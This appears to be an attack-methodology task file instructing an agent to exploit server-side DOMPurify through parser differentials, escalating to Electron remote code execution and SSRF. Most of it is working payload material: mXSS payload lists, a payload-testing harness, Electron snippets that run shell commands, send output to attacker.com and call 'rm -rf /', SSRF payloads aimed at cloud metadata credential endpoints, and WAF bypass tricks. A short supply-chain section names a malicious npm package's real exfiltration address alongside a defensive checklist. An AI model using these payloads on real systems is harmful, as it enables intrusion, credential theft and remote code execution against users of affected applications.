# AGENT TASK: Server-Side DOMPurify Exploitation - Parser Differentials to RCE
# PURPOSE: Exploit jsdom/linkedom/happy-dom parser gaps, Electron RCE, SSRF, supply chain
# PRIORITY: Critical for Node.js and Electron targets
# EXPLOITS: Namespace gaps, scripting flag differential, custom element differential
# ESCALATION: XSS to RCE in Electron, SSRF via HTML processing, supply chain analysis
# OUTPUT: Server-side differential findings, RCE proof, SSRF chains
# SECTIONS: F22 (Server-Side DOMPurify Exploitation)
---

## SECTION F22: Server-Side DOMPurify Exploitation — Parser Differentials to RCE

### The Server-Side DOMPurify Landscape

Server-side DOMPurify runs in Node.js using a JavaScript DOM implementation as a substitute for the browser's native DOM. The most common configurations:

```
Configuration                    | DOM Implementation | Parser        | Namespace Support
---------------------------------|-------------------|---------------|-------------------
dompurify + jsdom                | jsdom             | parse5        | Full
isomorphic-dompurify             | jsdom (default)   | parse5/htmlparser2 | Varies
dompurify + linkedom             | linkedom          | htmlparser2   | LIMITED
dompurify + happy-dom            | happy-dom         | custom        | Partial
```

### Core Vulnerability: Parser Differentials

The fundamental problem with server-side DOMPurify is that the DOM parser used on the server DIFFERS from the DOM parser the browser will use to render the sanitized HTML. DOMPurify sanitizes based on the DOM tree the server-side parser produces, but the browser may parse the same HTML into a DIFFERENT DOM tree.

```
Server-Side Sanitization Gap
==============================

Attacker's HTML ──► Server-side parser (parse5/htmlparser2) ──► DOM Tree A
                                                                    │
                                                             DOMPurify sanitizes
                                                             based on Tree A
                                                                    │
                                                             Serialized HTML
                                                                    │
                                                             Sent to browser
                                                                    │
                                              Browser parser (Blink/Gecko/WebKit) ──► DOM Tree B
                                                                                         │
                                              If Tree A ≠ Tree B, sanitization may miss 
                                              elements/attributes that appear in Tree B
```

### Exploit Category 1: Namespace Handling Gaps

**htmlparser2 has NO SVG/MathML namespace support:**

```javascript
// Server-side test (Node.js)
const htmlparser2 = require('htmlparser2');
const { WritableStream } = require('htmlparser2/lib/WritableStream');

// htmlparser2 treats ALL tags as HTML — no foreign content parsing
const html = '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style>';

// When parsed by htmlparser2:
// - <math> is treated as unknown HTML element
// - No namespace switch occurs
// - <style> content is treated as text (not parsed as HTML)
// - <img> inside <style> is NOT recognized as an element

// When the sanitized output reaches the browser:
// - Browser DOES perform namespace switch at <math>
// - Integration point at <mtext> switches back to HTML
// - <mglyph> triggers HTML parsing within MathML context
// - <style> in HTML context → rawtext element
// - <img> after </style> breakout → element with event handler
// → XSS
```

**Proof-of-concept with isomorphic-dompurify:**

```javascript
// isomorphic-dompurify on server
const DOMPurify = require('isomorphic-dompurify');

// Payloads that exploit server/browser parser differential:
const payloads = [
  // Namespace confusion (server doesn't understand SVG context)
  '<svg><desc><style><a href="</style><img src=x onerror=alert(1)>">',
  
  // MathML integration point (server doesn't switch parsing mode)
  '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
  
  // foreignObject breakout
  '<svg><foreignObject><p><style><p title="</style><img src=x onerror=alert(1)>">',
  
  // Noscript differential (server has no scripting flag)
  '<noscript><p title="</noscript><img src onerror=alert(1)>">'
];

payloads.forEach((payload, i) => {
  const clean = DOMPurify.sanitize(payload);
  console.log(`Payload ${i}: ${clean}`);
  // Server may pass these through because its parser doesn't see the XSS
  // Browser will parse differently and execute the payload
});
```

### Exploit Category 2: Scripting Flag Differential

The HTML spec defines a "scripting flag" that affects how `<noscript>` is parsed:
- Scripting enabled (browsers with JS on): `<noscript>` content is rawtext (not parsed as HTML)
- Scripting disabled (or server-side): `<noscript>` content IS parsed as HTML

```javascript
// jsdom can be configured with or without JavaScript enabled:
const { JSDOM } = require('jsdom');

// Without JavaScript (default for many server configs):
const dom1 = new JSDOM('<noscript><img src=x onerror=alert(1)></noscript>', {
  runScripts: 'outside-only'  // No JS execution
});
// jsdom parses <noscript> content as HTML → sees <img> → DOMPurify removes onerror

// Browser with JavaScript enabled:
// <noscript> content is rawtext → NOT parsed as HTML
// Content is preserved as text, but...
// If the noscript content contains markup that "breaks out" when the context changes,
// the browser may parse it differently on re-insertion

// The noscript scripting-flag differential is one of the most reliable
// server-vs-browser mXSS vectors
```

### Exploit Category 3: Custom Element Differential

```javascript
// Server-side: custom elements are not registered → treated as unknown HTML elements
// Browser: custom elements may have lifecycle callbacks that modify DOM

// Server sanitizes this as a plain div-like element:
const html = '<custom-widget data-template="<img src=x onerror=alert(1)>">';
const clean = DOMPurify.sanitize(html);
// Output: <custom-widget data-template="<img src=x onerror=alert(1)>">
// DOMPurify allows data-* attributes by default
// The custom element itself is allowed (or needs CUSTOM_ELEMENT_HANDLING)

// Browser-side:
// customElements.define('custom-widget', class extends HTMLElement {
//   connectedCallback() {
//     this.innerHTML = this.dataset.template;  // XSS!
//   }
// });
```

### Escalation to RCE: Electron Applications

When server-side DOMPurify sanitization feeds an Electron renderer process, XSS can escalate to Remote Code Execution:

```
Electron RCE Escalation Chain
===============================

Step 1: Server-side DOMPurify sanitizes user content
         │ (Parser differential allows XSS payload through)
         │
Step 2: Content displayed in Electron renderer process
         │
Step 3: Check Electron security configuration:
         │
         ├─ nodeIntegration: true? ──► Direct Node.js access from renderer
         │    require('child_process').exec('whoami', (e,stdout) => {
         │      fetch('https://attacker.com/rce?output=' + encodeURIComponent(stdout));
         │    });
         │
         ├─ contextIsolation: false? ──► Prototype pollution → Node.js access
         │    // Overwrite a function the main process calls:
         │    window.someAPI = {
         │      callback: () => require('child_process').exec('...')
         │    };
         │
         └─ preload script with IPC? ──► Abuse exposed IPC channels
              // If preload exposes shell commands:
              window.electronAPI.execute('rm -rf /');
              // Or file system access:
              window.electronAPI.readFile('/etc/passwd');
```

**Real-World Example: Joplin RCE (CVE-2023-33726)**

```
Attack Chain
=============

1. Attacker creates a Joplin note with mXSS payload
2. Note is shared via Joplin's sync/sharing feature  
3. Victim opens the note in Joplin desktop (Electron app)
4. Server-side sanitization (isomorphic-dompurify with htmlparser2):
   - htmlparser2 has no namespace support
   - SVG/MathML namespace confusion payload passes through
5. Browser parser in Electron parses differently → XSS fires
6. Electron renderer has Node.js integration available
7. Payload executes arbitrary system commands

Proof of concept payload (simplified):
<form><math><mtext></form><form><mglyph><style></math>
<img src onerror="require('child_process').exec('calc.exe')">
```

### SSRF via Server-Side HTML Processing

When the server processes sanitized HTML and fetches referenced resources:

```
SSRF Attack Surface
=====================

DOMPurify allows these URL-bearing attributes by default:
  ├─ <img src="...">
  ├─ <a href="...">
  ├─ <video src="..."> / <video poster="...">
  ├─ <audio src="...">
  ├─ <source src="...">
  ├─ <link href="...">  (if not in FORBID_TAGS)
  └─ <object data="..."> (if allowed)

If the server renders HTML to images (headless browser, PDF generation,
email rendering), it may FETCH these URLs server-side:

<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  → SSRF to AWS metadata endpoint → steal IAM credentials

<img src="http://metadata.google.internal/computeMetadata/v1/?recursive=true">
  → SSRF to GCP metadata endpoint

<img src="http://169.254.169.254/metadata/v1.json">
  → SSRF to DigitalOcean metadata endpoint

<link rel="stylesheet" href="http://internal-jenkins.corp:8080/api/json">
  → SSRF to internal Jenkins API

<img src="http://localhost:6379/SET/key/value">
  → SSRF to local Redis (protocol confusion)
```

### Supply Chain Attack Analysis: express-dompurify

```
Malicious Package Timeline
============================

Package: express-dompurify (npm)
NOT affiliated with DOMPurify — name-squatting attack

What it stole:
  ├─ Browser cookies and browsing history
  ├─ Cryptocurrency wallet data (MetaMask, Phantom, etc.)
  ├─ macOS Keychain entries
  ├─ Saved credentials from browsers
  └─ System information

Obfuscation techniques:
  ├─ Legitimate-looking package.json with DOMPurify as dependency
  ├─ Actual functionality: Express middleware wrapper (works correctly)
  ├─ Hidden payload in postinstall script
  ├─ Obfuscated function names: UpAppData, UpCryptoAppWalletData, UpKeyChain
  └─ Data exfiltrated via POST to http://95.216.251.178:8001/uploads

Detection checklist:
  [ ] Verify package name matches official: 'dompurify' (npm) or 'isomorphic-dompurify'
  [ ] Check npm publisher matches 'nicedude' (Mario Heiderich / Cure53)
  [ ] Inspect postinstall scripts: npm show <package> scripts
  [ ] Use npm audit / socket.dev for supply chain scanning
  [ ] Pin exact versions in package-lock.json
  [ ] Review npm diff for unexpected changes between versions
```

### WAF Interaction Analysis

When both a WAF and DOMPurify are in the pipeline, the interaction can create unexpected bypass opportunities:

```
Double Sanitization Issues
============================

Scenario: WAF → Application → DOMPurify → innerHTML

Problem 1: WAF HTML-decodes, DOMPurify sees decoded
  Input:    &lt;script&gt;alert(1)&lt;/script&gt;
  After WAF decode: <script>alert(1)</script>
  DOMPurify: removes script
  → No bypass, but WAF logging shows "blocked" while DOMPurify did the work

Problem 2: WAF modifies payload, creates new bypass
  Input:    <scr<script>ipt>alert(1)</scr</script>ipt>
  WAF removes <script>: <script>alert(1)</script>
  DOMPurify: removes script
  → WAF's "sanitization" actually created a valid script tag

Problem 3: Encoding bypass through both layers
  Input:    %3Csvg%20onload%3Dalert(1)%3E  (URL-encoded)
  WAF: doesn't decode URL encoding (checks raw bytes) → passes
  Application: URL-decodes → <svg onload=alert(1)>
  DOMPurify: removes onload
  → DOMPurify catches it, but WAF missed it → WAF bypass
  
Problem 4: Chunked encoding
  WAF inspects full request body
  But: chunked Transfer-Encoding can split payload across chunks
  Some WAFs don't reassemble chunks for inspection
  Input split: chunk1="<scri" chunk2="pt>alert(1)</script>"
  WAF: doesn't see complete <script> tag → passes
  Application: receives full body → DOMPurify sanitizes
  → DOMPurify catches it, but this demonstrates WAF bypass
```

### Complete Server-Side Testing Framework

```javascript
// Differential testing framework for server-side DOMPurify
// Tests payloads across multiple server-side parsers and compares to browser behavior

const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

// Test payloads — organized by attack class
const PAYLOADS = {
  namespace_confusion: [
    '<svg><desc><style><a href="</style><img src=x onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<svg><foreignObject><p><style><p title="</style><img src onerror=alert(1)>">',
  ],
  scripting_flag: [
    '<noscript><p title="</noscript><img src onerror=alert(1)>">',
  ],
  rawtext: [
    '<noembed><img src=x onerror=alert(1)></noembed>',
    '<xmp><img src=x onerror=alert(1)></xmp>',
  ],
  depth_exploitation: [
    '<div>'.repeat(513) + '<style><img src=x onerror=alert(1)></style>' + '</div>'.repeat(513),
  ],
  custom_elements: [
    '<custom-el data-tmpl="<img src=x onerror=alert(1)>"></custom-el>',
  ],
  foster_parenting: [
    '<table><div><script>alert(1)</script></div></table>',
  ],
  comment_tricks: [
    '<!--><img src=x onerror=alert(1)>-->',
    '<svg><!--<img src=x>--></svg>',
  ]
};

function testServerSide(implementation) {
  let window, DOMPurify;
  
  switch (implementation) {
    case 'jsdom':
      window = new JSDOM('').window;
      DOMPurify = createDOMPurify(window);
      break;
    // Add linkedom, happy-dom configurations...
  }
  
  const results = {};
  
  for (const [category, payloads] of Object.entries(PAYLOADS)) {
    results[category] = payloads.map(payload => {
      const sanitized = DOMPurify.sanitize(payload);
      
      // Check if dangerous patterns survive
      const hasDangerousEvent = /\bon\w+\s*=/i.test(sanitized);
      const hasJavascriptURI = /javascript:/i.test(sanitized);
      const hasScriptTag = /<script/i.test(sanitized);
      
      return {
        payload: payload.substring(0, 80) + '...',
        sanitized: sanitized.substring(0, 100) + '...',
        dangerous: hasDangerousEvent || hasJavascriptURI || hasScriptTag,
        length: sanitized.length,
        implementation
      };
    });
  }
  
  return results;
}

// Run differential test
const jsdomResults = testServerSide('jsdom');

// Output results
console.log('=== Server-Side DOMPurify Differential Test Results ===');
for (const [category, results] of Object.entries(jsdomResults)) {
  console.log(`\n--- ${category} ---`);
  results.forEach(r => {
    const status = r.dangerous ? '⚠ DANGEROUS' : '✓ Safe';
    console.log(`  ${status}: ${r.payload}`);
    if (r.dangerous) {
      console.log(`    Output: ${r.sanitized}`);
    }
  });
}
```

---

*End of Deep Attack Methodology Sections F20-F22*
